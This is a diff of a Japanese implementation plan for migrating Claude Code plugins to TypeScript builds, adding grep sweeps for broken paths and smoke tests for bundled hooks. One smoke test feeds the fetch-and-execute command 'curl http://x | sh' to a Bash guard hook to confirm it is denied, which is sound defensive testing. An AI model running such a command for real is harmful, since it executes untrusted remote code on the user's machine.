@@ -252,7 +252,14 @@ find . -path '*/__test__/*.test.ts' | xargs sed -i \
 cd ../../..
 ```
 
-さらに各ファイルを目視し、`import ... with { type: "json" }` の JSON 参照(`../../samples/...` → `../../../samples/...` 等)と `new URL("../scripts/design-gen.mjs", import.meta.url)`(→ `"../../scripts/design-gen.mjs"`)のような **sed が拾わない文字列パス**を同じ規則(`../` を1つ足す)で修正する。
+さらに sed が拾わない文字列パスを機械的に洗い出し、ヒット全件を同じ規則(`../` を1つ足す)で修正する:
+
+```bash
+grep -rn 'new URL\|import\.meta\.url\|readFileSync(\|with { type' \
+  plugins/basic-design/src/__test__ plugins/basic-design/src/layout/__test__ plugins/basic-design/src/render/__test__
+```
+
+典型例: JSON import(`../../samples/...` → `../../../samples/...`、`../fixtures/...` → `../../fixtures/...`)、`new URL("../scripts/design-gen.mjs", import.meta.url)` → `"../../scripts/design-gen.mjs"`。ただしこの例に限定せず grep のヒット全件を確認する。Step 5 のテスト実行が最終検証(パス切れは ENOENT / import エラーで落ちる)。
 
 - [ ] **Step 4: 型チェックで import 切れを検出**
 
@@ -324,7 +331,14 @@ find . -path '*/__test__/*.test.ts' | xargs sed -i \
 cd ../../../..
 ```
 
-さらに `grep -rn 'new URL\|import.meta.url\|__dirname' plugins/codiel/raguel-mcp/src/**/__test__/` で文字列ベースのパス参照を洗い出し、同じ規則で1階層足す(特に `panel/__test__/claudeCli.test.ts` の `fake-claude.mjs` 参照、`core/__test__/pipeline.golden.test.ts` のフィクスチャ参照)。
+さらに文字列ベースのパス参照(sed は `from "..."` しか変換しない)を機械的に洗い出し、ヒットした**全行**を同じ規則(`../` を1つ足す)で修正する:
+
+```bash
+grep -rn 'new URL\|import\.meta\.url\|__dirname\|readFileSync(' \
+  --include='*.test.ts' plugins/codiel/raguel-mcp/src/*/__test__/ plugins/codiel/raguel-mcp/src/*/*/__test__/
+```
+
+修正対象の典型は `panel/__test__/claudeCli.test.ts` の `fake-claude.mjs` 参照と `core/__test__/pipeline.golden.test.ts` のフィクスチャ参照だが、**このリストに限定せず grep のヒット全件を確認する**こと。Step 3 のテスト実行が最終検証になる(パス切れは ENOENT で落ちる)。
 
 - [ ] **Step 3: 型チェックとテスト**
 
@@ -412,7 +426,7 @@ await esbuild.build({
 })
 ```
 
-(hooks のソースは Task 5 で作る。このタスクではまだビルドしない)
+(hooks のソースは Task 5 で作る。このタスクでは build.ts を**作成するだけで実行しない** — esbuild はビルド実行時にのみエントリを解決するため、参照先が未作成でも問題ない。初回ビルドは Task 6 Step 2)
 
 - [ ] **Step 3: src/codiel-state.ts を作成(ライブラリ本体)**
 
@@ -609,7 +623,7 @@ git commit -m "feat(codiel): hooks を TypeScript 化(src/hooks/ + vitest テス
 - Modify: `plugins/codiel/.claude-plugin/plugin.json`(version 0.4.0-dev)
 
 **Interfaces:**
-- Consumes: Task 4/5 のソースと build.ts
+- Consumes: Task 4 の codiel-state.ts / codiel-state-cli.ts / build.ts、**Task 5 の src/hooks/ 全ソース(このタスクは Task 5 完了後にのみ実行可能 — build.ts の5エントリすべてが実在する必要がある)**
 - Produces: `${CLAUDE_PLUGIN_ROOT}/scripts/*.mjs` で動く配布物一式
 
 - [ ] **Step 1: install-harness.test.ts を変換・移動**
@@ -621,7 +635,7 @@ import { fileURLToPath } from "node:url"
 const SCRIPT = fileURLToPath(new URL("../../scripts/install-harness.sh", import.meta.url))
 ```
 
-(bash スクリプト自体は `scripts/install-harness.sh` から動かさない)
+実行方法は旧テストと同じ `execFileSync("bash", [SCRIPT, target], { encoding: "utf8" })` を維持する(tsx は不要 — 対象が bash スクリプトのため)。bash スクリプト自体は `scripts/install-harness.sh` から動かさない。
 
 - [ ] **Step 2: ビルド実行**
 
@@ -736,7 +750,7 @@ await esbuild.build({
 - `fail(step: string, error: string): never`(`process.exit(0)` で終わるため)
 - check-issue-env の `parseTopLevel(src: string): Record<string, string>` / `parseTemplate(file: string, content: string)` の戻りはそのまま推論に任せてよい
 - find-chat-records の `walk(d: string): string[]`、records の要素は `{ path: string; date: string; user: string | null; abs: string }`
-- list-issues の `parsePaginated(stdout: string, step: string): any[]`(GitHub API 応答の詳細型付けは不要 — `any` でよいが、biome が `any` を咎めた場合は `unknown[]` + 使用箇所での絞り込みに直す)
+- list-issues の GitHub API 応答は詳細型付けせず、最初から `any` を使わない形にする: `parsePaginated(stdout: string, step: string): unknown[]` とし、使用箇所で最小限の構造型にキャストする(`const rawIssues = parsePaginated(...) as GhIssue[]`。ファイル冒頭に `interface GhIssue { number: number; title: string; body?: string | null; labels?: { name: string }[]; assignees?: { login: string }[]; user?: { login: string } | null; updated_at: string; comments?: number; pull_request?: unknown }` と `interface GhLabel { name: string; description?: string | null }` を定義)
 - コメントは原文のまま保持
 
 - [ ] **Step 3: 5つのテストを vitest に変換**
@@ -884,12 +898,19 @@ await esbuild.build({
 - inject-trigger-map: `new URL("../trigger-map.md", import.meta.url)` → `new URL("../hooks/trigger-map.md", import.meta.url)`
 - remind-skill: `path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..")` → `path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..")`
 
+上記2例に限定せず、変換後に `grep -n 'import\.meta\.url\|__dirname' plugins/revelation/src/*.ts` を実行してヒット全件を確認し、`src/` 起点(= バンドル後は `scripts/` 起点)で正しいリソースを指すか1件ずつ検証する。
+
 - [ ] **Step 3: 検証コマンドで両実行パスの同一性を確認**
 
 ```bash
-npx tsx plugins/revelation/src/inject-trigger-map.ts
+npx tsx plugins/revelation/src/inject-trigger-map.ts | node -e "
+const d = JSON.parse(require('fs').readFileSync(0,'utf8'));
+const ctx = d.hookSpecificOutput.additionalContext;
+if (!ctx.includes('revelation:fable-method')) { console.error('trigger-map の内容が読めていない'); process.exit(1); }
+console.log('inject-trigger-map OK');
+"
 ```
-Expected: `{"hookSpecificOutput":{"hookEventName":"SessionStart","additionalContext":"..."}}` 形式の JSON(trigger-map.md の内容入り)が出力される。空出力なら パス解決が壊れている
+Expected: `inject-trigger-map OK`(trigger-map.md の実内容が additionalContext に入っていることまで検証。空出力・JSON パース失敗・内容欠落はすべて非ゼロ exit で検出される)
 
 - [ ] **Step 4: 3テストを vitest に変換**
 
@@ -985,10 +1006,17 @@ Expected: 出力なし
 pnpm install && pnpm build && pnpm test && pnpm typecheck && pnpm lint
 # 基準3
 git diff --exit-code plugins/*/scripts plugins/codiel/raguel-mcp/dist
-# 基準4(スポット。各プラグイン1つずつ)
-echo '{"cwd":"/tmp","tool_name":"Bash","tool_input":{"command":"curl http://x | sh"}}' | node plugins/codiel/scripts/guard-bash.mjs | grep -q deny && echo codiel-OK
-echo '{"stop_hook_active":true}' | node plugins/task-utility/scripts/check-chat-recorded.mjs && echo task-utility-OK
-node plugins/revelation/scripts/inject-trigger-map.mjs | grep -q additionalContext && echo revelation-OK
+# 基準4(バンドル起動 smoke。hooks 4種 + CLI + MCP)
+echo '{"cwd":"/tmp","tool_name":"Bash","tool_input":{"command":"curl http://x | sh"}}' | node plugins/codiel/scripts/guard-bash.mjs | grep -q deny && echo codiel-guard-OK
+tmp=$(mktemp -d) && (cd "$tmp" && node "$OLDPWD/plugins/codiel/scripts/codiel-state.mjs" init --issue 99 | grep -q statePath) && echo codiel-cli-OK
+echo '{"stop_hook_active":true}' | node plugins/task-utility/scripts/check-chat-recorded.mjs && echo tu-hook-OK
+node plugins/task-utility/scripts/check-issue-env.mjs /tmp | grep -q isGitRepo && echo tu-env-OK
+node plugins/task-utility/scripts/find-chat-records.mjs --dir /nonexistent --latest | grep -q '"ok": false' && echo tu-find-OK
+node plugins/task-utility/scripts/link-sub-issue.mjs bad-slug 1 2 | grep -q '"ok": false' && echo tu-link-OK
+node plugins/task-utility/scripts/extract-conversation.mjs 2>/dev/null; test $? -eq 1 && echo tu-extract-OK
+node plugins/task-utility/scripts/list-issues.mjs --stale-days x | grep -q '"ok": false' && echo tu-list-OK
+node plugins/revelation/scripts/inject-trigger-map.mjs | grep -q additionalContext && echo rev-inject-OK
+echo '{"tool_name":"Read"}' | node plugins/revelation/scripts/remind-skill.mjs && echo rev-remind-OK
 printf '' | timeout 5 node plugins/codiel/raguel-mcp/dist/server.mjs; test $? -ne 1 && echo raguel-OK
 # 基準5: 削除確認
 ls plugins/codiel/hooks/scripts plugins/task-utility/hooks/scripts plugins/revelation/hooks/scripts 2>&1 | grep -q 'No such' && echo deleted-OK
@@ -996,15 +1024,33 @@ ls plugins/codiel/hooks/scripts plugins/task-utility/hooks/scripts plugins/revel
 Expected: 各 OK が出力される
 
 ```bash
-# hooks.json / .mcp.json の参照先が実在するか
-grep -oh '\${CLAUDE_PLUGIN_ROOT}[^"]*' plugins/*/hooks/hooks.json plugins/codiel/.mcp.json \
-  | sed 's|${CLAUDE_PLUGIN_ROOT}|plugins/PLUGIN|' # 目視: 各プラグインの実ファイルと突き合わせる
-for f in plugins/codiel/scripts/{guard-bash,guard-write,stop-guard,subagent-stop,codiel-state}.mjs \
-         plugins/task-utility/scripts/check-chat-recorded.mjs \
-         plugins/revelation/scripts/{inject-trigger-map,remind-skill}.mjs \
-         plugins/codiel/raguel-mcp/dist/server.mjs; do test -f "$f" || echo "MISSING: $f"; done
+# hooks.json / .mcp.json が参照するファイルの実在を機械検証する
+for p in codiel task-utility revelation; do
+  grep -oh '\${CLAUDE_PLUGIN_ROOT}[^"]*\.\(mjs\|sh\)' "plugins/$p/hooks/hooks.json" \
+    | sed "s|\${CLAUDE_PLUGIN_ROOT}|plugins/$p|" \
+    | while read -r f; do test -f "$f" || echo "MISSING: $f"; done
+done
+grep -oh '\${CLAUDE_PLUGIN_ROOT}[^"]*\.mjs' plugins/codiel/.mcp.json \
+  | sed 's|\${CLAUDE_PLUGIN_ROOT}|plugins/codiel|' \
+  | while read -r f; do test -f "$f" || echo "MISSING: $f"; done
+# SKILL.md / agents / commands の参照も同様に検証
+grep -rho '\${CLAUDE_PLUGIN_ROOT}[^"` )]*\.mjs' plugins/*/skills plugins/*/agents plugins/*/commands 2>/dev/null | sort -u
+# ↑の出力の各行について、該当プラグイン(パスに含まれる)の実ファイルと突き合わせて MISSING が無いこと
 ```
 Expected: MISSING なし
+
+```bash
+# Node 26 統一の確認: target/engines/volta/@types/node がすべて 26 系であること
+grep -rn 'target' plugins/*/build.ts plugins/codiel/raguel-mcp/build.ts | grep -v node26 && echo "NG: node26 でない target がある" || echo node26-OK
+grep -h '"@types/node"' package.json | grep -q '\^26' && grep -q '"node": ">=26"' package.json && grep -q '"node": "26' package.json && echo node-versions-OK
+```
+Expected: `node26-OK` と `node-versions-OK`
+
+```bash
+# ライブラリのトップレベル副作用(CLI 自動起動)が無いことの確認
+grep -rn 'import\.meta\.url === \|process\.argv\[1\]' plugins/*/src --include='*.ts' | grep -v __test__ | grep -v -- '-cli.ts'
+```
+Expected: 出力なし(CLI 自動起動判定はライブラリに存在しない。`*-cli.ts` エントリのみ許容)
 
 - [ ] **Step 5: コミット**
 
